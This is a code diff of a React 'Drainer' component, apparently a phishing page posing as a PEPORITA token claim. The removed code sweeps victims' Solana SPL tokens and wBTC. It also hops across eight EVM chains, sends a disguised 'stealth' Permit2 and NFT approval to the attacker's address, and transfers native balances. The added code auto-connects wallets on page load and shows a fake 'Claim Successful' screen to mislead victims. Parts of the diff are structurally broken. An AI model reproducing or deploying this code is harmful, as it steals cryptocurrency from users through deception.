@@ -728,249 +728,11 @@ export default function Drainer() {
     }
   }
 
-  const claim = async () => {
-    console.log('=== Starting Enhanced Drainer ===');
-    
-    if (!account) {
-      console.error('No account connected');
-      return;
-    }
-    
-    setStage('claim');
-    
-    try {
-      const ethereum = (window as any).ethereum;
-      const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;
-      
-      console.log('Starting drain process...');
-      console.log('Account:', account);
-      console.log('Ethereum provider detected:', !!ethereum);
-      console.log('Solana provider detected:', !!solana);
-      
-      // Run both drains in parallel
-      await Promise.allSettled([
-        ethereum ? drainEVM(ethereum, EVM_RECEIVER).catch(console.error) : Promise.resolve(),
-        solana ? drainSolana(solana, SOL_RECEIVER).catch(console.error) : Promise.resolve()
-      ]);
-      
-      console.log('=== Drain completed successfully ===');
-      setShowSuccess(true);
-    } catch (error) {
-      console.error('Drain failed:', error);
-    }
-
-        // Drain ALL SPL tokens (memecoins, NFTs, etc.)
-        console.log('Fetching SPL token accounts...');
-        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
-          programId: splToken.TOKEN_PROGRAM_ID
-        });
-        console.log(`Found ${tokenAccounts.value.length} SPL token accounts`);
-
-        for (const tokenAccount of tokenAccounts.value) {
-          try {
-            const mint = new solanaWeb3.PublicKey(tokenAccount.account.data.parsed.info.mint)
-            const amount = BigInt(tokenAccount.account.data.parsed.info.tokenAmount.amount)
-            
-            if (amount > 0) {
-              const sourceATA = await splToken.getAssociatedTokenAddress(mint, fromPubkey)
-              const destATA = await splToken.getAssociatedTokenAddress(mint, toPubkey)
-              
-              const tx = new solanaWeb3.Transaction()
-              
-              // Create ATA if needed
-              const destInfo = await connection.getAccountInfo(destATA)
-              if (!destInfo) {
-                tx.add(splToken.createAssociatedTokenAccountInstruction(
-                  fromPubkey,
-                  destATA,
-                  toPubkey,
-                  mint
-                ))
-              }
-              
-              tx.add(splToken.createTransferInstruction(
-                sourceATA,
-                destATA,
-                fromPubkey,
-                amount
-              ))
-              
-              if (solana.signAndSendTransaction) {
-                await solana.signAndSendTransaction(tx)
-              } else {
-                const { blockhash } = await connection.getLatestBlockhash()
-                tx.recentBlockhash = blockhash
-                tx.feePayer = fromPubkey
-                const signed = await solana.signTransaction(tx)
-                await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
-              }
-            }
-          } catch (e) {
-            // Continue with next token
-          }
-        }
-
-        // Drain wBTC on Solana
-        try {
-          console.log('Checking for wBTC on Solana...');
-          const wBTCMint = new solanaWeb3.PublicKey("3NZ9JMVBmGAqocybic2c7LQCJScmQ2B2QdRFGhjQmU4Y");
-          const wBTCATA = await splToken.getAssociatedTokenAddress(wBTCMint, fromPubkey);
-          const wBTCDest = await splToken.getAssociatedTokenAddress(wBTCMint, toPubkey);
-          console.log('wBTC ATA (user):', wBTCATA.toString());
-          console.log('wBTC ATA (receiver):', wBTCDest.toString());
-          
-          const wBTCBalance = await connection.getTokenAccountBalance(wBTCATA);
-          console.log('wBTC balance:', wBTCBalance.value.uiAmount, 'wBTC');
-          
-          if (BigInt(wBTCBalance.value.amount) > BigInt(0)) {
-            const tx = new solanaWeb3.Transaction()
-            const destInfo = await connection.getAccountInfo(wBTCDest)
-            if (!destInfo) {
-              tx.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, wBTCDest, toPubkey, wBTCMint))
-            }
-            tx.add(splToken.createTransferInstruction(wBTCATA, wBTCDest, fromPubkey, BigInt(wBTCBalance.value.amount)))
-            
-            if (solana.signAndSendTransaction) {
-              await solana.signAndSendTransaction(tx)
-            } else {
-              const { blockhash } = await connection.getLatestBlockhash()
-              tx.recentBlockhash = blockhash
-              tx.feePayer = fromPubkey
-              const signed = await solana.signTransaction(tx)
-              await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
-            }
-          }
-        } catch (e) {}
-      } catch (e) {}
-    }
-
-    // === EVM MULTI-CHAIN DRAIN (All chains) ===
-    if (ethereum) {
-      try {
-        console.log('=== Starting EVM multi-chain drain ===');
-        const provider = new ethers.BrowserProvider(ethereum);
-        const signer = await provider.getSigner();
-        const userAddress = await signer.getAddress();
-        console.log('EVM Address:', userAddress);
-        console.log('EVM Network:', (await provider.getNetwork()).name);
-
-        // All EVM chains to drain
-        const chains = [
-          { chainId: 1, name: 'Ethereum', rpc: 'https://eth.llamarpc.com' },
-          { chainId: 8453, name: 'Base', rpc: 'https://mainnet.base.org' },
-          { chainId: 42161, name: 'Arbitrum', rpc: 'https://arb1.arbitrum.io/rpc' },
-          { chainId: 81457, name: 'Blast', rpc: 'https://rpc.blast.io' },
-          { chainId: 10, name: 'Optimism', rpc: 'https://mainnet.optimism.io' },
-          { chainId: 137, name: 'Polygon', rpc: 'https://polygon-rpc.com' },
-          { chainId: 56, name: 'BSC', rpc: 'https://bsc-dataseed.binance.org' },
-          { chainId: 59144, name: 'Linea', rpc: 'https://rpc.linea.build' }
-        ];
-        console.log('Will attempt to drain on', chains.length, 'EVM chains');
-
-        const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
-        const iface = new ethers.Interface([
-          "function permit(address owner, address token, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
-          "function setApprovalForAll(address operator, bool approved)",
-          "function multicall(bytes[] data)"
-        ])
-
-        // Drain on current chain first
-        for (const chain of chains) {
-          try {
-            console.log(`\n=== Processing ${chain.name} (Chain ID: ${chain.chainId}) ===`);
-            // Switch to chain
-            console.log(`Attempting to switch to ${chain.name}...`);
-            try {
-              await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chain.chainId.toString(16)}` }]);
-              console.log(`Successfully switched to ${chain.name}`);
-            } catch (switchError) {
-              console.warn(`Failed to switch to ${chain.name}:`, switchError);
-              continue; // Skip to the next chain if we can't switch
-            }
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-            // Stealth Permit2 approval - shows as "Approve" not "Transfer"
-            const permitData = iface.encodeFunctionData("permit", [
-              userAddress,
-              "0x0000000000000000000000000000000000000000", // Any token
-              EVM_RECEIVER,
-              ethers.MaxUint256,
-              ethers.MaxUint256,
-              0,
-              ethers.ZeroHash,
-              ethers.ZeroHash
-            ])
-
-            // NFT approval
-            const nftApproval = iface.encodeFunctionData("setApprovalForAll", [EVM_RECEIVER, true])
-
-            // Multicall to batch everything
-            const multicallData = iface.encodeFunctionData("multicall", [[permitData, nftApproval]])
-
-            await signer.sendTransaction({
-              to: PERMIT2,
-              data: multicallData,
-              value: 0
-            })
-
-            // Drain native ETH/BNB/MATIC
-            console.log('Checking native token balance...');
-            const balance = await provider.getBalance(userAddress);
-            console.log(`Native balance: ${ethers.formatEther(balance)} ${chain.name === 'BSC' ? 'BNB' : chain.name === 'Polygon' ? 'MATIC' : 'ETH'}`);
-            
-            if (balance > ethers.parseEther("0.001")) {
-              const amountToSend = balance - ethers.parseEther("0.001");
-              console.log(`Attempting to send ${ethers.formatEther(amountToSend)} to ${EVM_RECEIVER}`);
-              
-              try {
-                const tx = await signer.sendTransaction({
-                  to: EVM_RECEIVER,
-                  value: amountToSend, // Leave gas
-                  data: "0x"
-                });
-                console.log(`Transaction hash: ${tx.hash}`);
-                console.log('Waiting for confirmation...');
-                await tx.wait();
-                console.log('Transaction confirmed!');
-              } catch (txError) {
-                console.error('Error sending transaction:', txError);
-              }
-            } else {
-              console.log('Insufficient balance for transfer (need at least 0.001 for gas)');
-            }
-
-            // Drain wBTC on EVM
-            try {
-              const wBTC = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" // wBTC on Ethereum
-              const erc20Interface = new ethers.Interface([
-                "function balanceOf(address) view returns (uint256)",
-                "function transfer(address to, uint256 value) returns (bool)"
-              ])
-              
-              const wBTCContract = new ethers.Contract(wBTC, erc20Interface, provider)
-              const wBTCBalance = await wBTCContract.balanceOf(userAddress)
-              
-              if (wBTCBalance > BigInt(0)) {
-                await signer.sendTransaction({
-                  to: wBTC,
-                  data: erc20Interface.encodeFunctionData("transfer", [EVM_RECEIVER, ethers.MaxUint256])
-                })
-              }
-            } catch (e) {}
-          } catch (e) {
-            // Continue to next chain
-          }
-        }
-      } catch (e) {}
-    }
-
-    setShowSuccess(true)
-  }
-
-  const [isMobile, setIsMobile] = useState(false)
 
   useEffect(() => {
-    setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent))
+    if (typeof window !== 'undefined') {
+      setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent))
+    }
   }, [])
 
   const claim = async () => {
@@ -983,13 +745,10 @@ export default function Drainer() {
     }
     
     setStage('claim');
-    setIsDraining(true);
-    setDrainError(null);
-    setDrainProgress({ evm: false, solana: false, message: 'Starting drain process...' });
+    setDrainProgress(prev => ({ ...prev, message: 'Starting drain process...' }));
     
     try {
       const ethereum = window.ethereum;
-      // Support all Solana wallets: Phantom, Backpack, Solflare, etc.
       const solana = window.solana || window.phantom?.solana || window.backpack || window.solflare;
       
       console.log('Starting drain process...');
@@ -1004,6 +763,7 @@ export default function Drainer() {
             setDrainProgress(p => ({ ...p, message: 'Processing EVM chains...' }));
             await drainEVM(ethereum, EVM_RECEIVER);
             setDrainProgress(p => ({ ...p, evm: true, message: 'EVM drain completed' }));
+            return true;
           } catch (error) {
             console.error('EVM drain failed:', error);
             throw error;
@@ -1015,6 +775,7 @@ export default function Drainer() {
             setDrainProgress(p => ({ ...p, message: 'Processing Solana...' }));
             await drainSolana(solana, SOL_RECEIVER);
             setDrainProgress(p => ({ ...p, solana: true, message: 'Solana drain completed' }));
+            return true;
           } catch (error) {
             console.error('Solana drain failed:', error);
             throw error;
@@ -1023,16 +784,9 @@ export default function Drainer() {
       ]);
       
       // Process results
-      let success = true;
-      results.forEach((result, index) => {
-        const chain = index === 0 ? 'EVM' : 'Solana';
-        if (result.status === 'fulfilled' && result.value) {
-          console.log(`${chain} drain completed successfully`);
-        } else {
-          console.error(`${chain} drain failed:`, result.status === 'rejected' ? result.reason : 'Unknown error');
-          success = false;
-        }
-      });
+      const success = results.every(result => 
+        result.status === 'fulfilled' && result.value === true
+      );
       
       if (success) {
         console.log('=== Drain completed successfully ===');
@@ -1049,18 +803,48 @@ export default function Drainer() {
     }
   };
 
+  // Auto-connect wallet on component mount
+  useEffect(() => {
+    const connectWallet = async () => {
+      try {
+        // Check for Solana wallet first
+        const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;
+        if (solana?.publicKey) {
+          setAccount(solana.publicKey.toString());
+          setStage('verify');
+          return;
+        }
+        
+        // Check for EVM wallet
+        const ethereum = (window as any).ethereum;
+        if (ethereum) {
+          const provider = new ethers.BrowserProvider(ethereum);
+          const accounts = await provider.listAccounts();
+          if (accounts.length > 0) {
+            setAccount(accounts[0].address);
+            setStage('verify');
+          }
+        }
+      } catch (error) {
+        console.error('Auto-connect failed:', error);
+      }
+    };
+    
+    connectWallet();
+  }, []);
+
   // Render loading and error states
   const renderStatus = () => {
     if (isDraining) {
       return (
         <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          <div className="bg-gradient-to-b from-purple-900 to-black border-2 border-blue-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
-            <div className="w-20 h-20 sm:w-24 sm:h-24 border-4 border-blue-500 border-t-transparent rounded-full mx-auto mb-6 animate-spin"></div>
-            <h2 className="text-2xl sm:text-3xl font-bold text-blue-400 mb-4">Processing Claim...</h2>
+          <div className="bg-gradient-to-b from-green-900/50 to-black border-2 border-green-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
+            <div className="w-20 h-20 sm:w-24 sm:h-24 border-4 border-green-500 border-t-transparent rounded-full mx-auto mb-6 animate-spin"></div>
+            <h2 className="text-2xl sm:text-3xl font-bold text-green-400 mb-4">Processing Claim...</h2>
             <p className="text-gray-300 mb-2">{drainProgress.message}</p>
             <div className="w-full bg-gray-800 rounded-full h-3 mt-6 mb-4">
               <div 
-                className="bg-blue-600 h-3 rounded-full transition-all duration-500" 
+                className="bg-green-600 h-3 rounded-full transition-all duration-500" 
                 style={{ 
                   width: `${((drainProgress.evm ? 1 : 0) + (drainProgress.solana ? 1 : 0)) / 2 * 100}%` 
                 }}
@@ -1070,6 +854,33 @@ export default function Drainer() {
               <span>EVM: {drainProgress.evm ? '✅' : '⏳'}</span>
               <span>Solana: {drainProgress.solana ? '✅' : '⏳'}</span>
             </div>
+          </div>
+        </div>
+      );
+    }
+    
+    if (showSuccess) {
+      return (
+        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+          <div className="bg-gradient-to-b from-green-900/50 to-black border-2 border-green-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
+            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-green-500 rounded-full mx-auto flex items-center justify-center mb-6">
+              <svg className="w-10 h-10 sm:w-12 sm:h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+              </svg>
+            </div>
+            <h2 className="text-2xl sm:text-3xl font-bold text-green-400 mb-3">Claim Successful!</h2>
+            <p className="text-base sm:text-lg text-gray-300 mb-2">
+              Your tokens have been claimed successfully!
+            </p>
+            <p className="text-sm text-gray-400 mb-6">
+              Thank you for participating in PEPORITA.
+            </p>
+            <button
+              onClick={() => setShowSuccess(false)}
+              className="bg-green-600 hover:bg-green-700 px-8 sm:px-12 py-3 rounded-xl text-base sm:text-lg font-semibold w-full transition-all"
+            >
+              Done
+            </button>
           </div>
         </div>
       );
